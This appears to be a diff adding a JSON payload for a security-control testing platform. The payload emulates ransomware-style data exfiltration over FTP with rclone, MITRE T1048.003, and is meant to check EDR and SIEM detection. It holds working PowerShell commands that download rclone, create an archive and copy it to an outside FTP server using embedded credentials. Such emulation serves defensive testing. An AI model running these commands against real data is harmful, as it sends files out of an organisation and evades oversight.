@@ -1,0 +1,81 @@
+{
+  "command_content": "$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName\n$exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName\n&$rclone_bin config create ftpserver \"ftp\" \"host\" #{ftp_server} \"port\" #{ftp_port} \"user\" #{ftp_user} \"pass\" #{ftp_pass}\n&$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate",
+  "command_executor": "psh",
+  "payload_arguments": [
+    {
+      "default_value": "ftp.dlptest.com",
+      "key": "ftp_server",
+      "type": "text"
+    },
+    {
+      "default_value": "rNrKYTX9g7z3RgJRmxWuGHbeu",
+      "key": "ftp_pass",
+      "type": "text"
+    },
+    {
+      "default_value": "dlpuser",
+      "key": "ftp_user",
+      "type": "text"
+    },
+    {
+      "default_value": "21",
+      "key": "ftp_port",
+      "type": "text"
+    }
+  ],
+  "payload_attack_patterns": [
+    "T1048.003"
+  ],
+  "payload_description": "Rclone may be used by an adversary to exfiltrate data to a publicly hosted FTP server.\n[Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)",
+  "payload_domains": [
+    {
+      "domain_color": "#9933CC",
+      "domain_name": "Data Exfiltration"
+    },
+    {
+      "domain_color": "#389CFF",
+      "domain_name": "Endpoint"
+    },
+    {
+      "domain_color": "#009933",
+      "domain_name": "Network"
+    }
+  ],
+  "payload_elevation_required": true,
+  "payload_execution_arch": "ALL_ARCHITECTURES",
+  "payload_expectations": [
+    "DETECTION",
+    "PREVENTION"
+  ],
+  "payload_expected_security_platforms": {
+    "DETECTION": [
+      "EDR",
+      "SIEM",
+      "XDR"
+    ],
+    "PREVENTION": [
+      "EDR",
+      "XDR"
+    ]
+  },
+  "payload_external_id": "58d33f75-cf14-4008-ae8d-d2cdcf1b5b0a",
+  "payload_name": "Exfiltration Over Alternative Protocol - FTP - Rclone",
+  "payload_platforms": [
+    "Windows"
+  ],
+  "payload_prerequisites": [
+    {
+      "check_command": "if (Test-Path C:\\Users\\Public\\Downloads\\exfil.zip) {exit 0} else {exit 1}\n",
+      "description": "Check if the exfil package exists\n",
+      "executor": "psh",
+      "get_command": "fsutil file createnew C:\\Users\\Public\\Downloads\\exfil.zip 20485760\n"
+    },
+    {
+      "check_command": "if (Test-Path C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}\n",
+      "description": "Check if rclone zip exists",
+      "executor": "psh",
+      "get_command": "Invoke-WebRequest -Uri \"https://downloads.rclone.org/rclone-current-windows-amd64.zip\" -OutFile \"C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip\"\nExpand-Archive C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip -DestinationPath C:\\Users\\Public\\Downloads\\\n"
+    }
+  ],
+  "payload_type": "Command"
+}
